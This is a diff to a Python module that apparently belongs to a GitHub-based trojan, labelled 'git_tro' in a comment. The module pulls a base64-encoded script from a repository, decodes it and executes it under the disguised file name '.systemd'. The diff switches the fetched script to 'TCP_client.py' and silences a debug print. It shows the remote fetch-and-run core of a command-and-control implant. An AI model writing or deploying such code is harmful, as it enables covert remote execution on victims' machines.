@@ -3,9 +3,10 @@ import json
 import base64
 import os
 
-scriptPath = "scripts/test" #"modules/dirlister.py" #
+#TODO: Try this module with win
+scriptPath = "scripts/TCP_client.py"
 TargetScript= ".systemd"
-ScriptExec = "python "
+ScriptExec = "python3.5"
 encodedFiles  = False
 
 def connect_to_github():
@@ -36,7 +37,7 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 	#content = None
 	if script is not None:
 		content	= base64.b64decode(script).decode()
-		print(content)
+		#print(content)
 		#try:
 		#	os.makedirs("scripts", mode=777)
 		#except:
@@ -52,3 +53,5 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 		#TODO: Customize log file path
 		#os.system("echo 'getRunScript: Unable to find file {}' >> logFile.log".format(scriptPath))
 		return str("getRunScript: Unable to find script {}".format(scriptPath))
+
+#run()
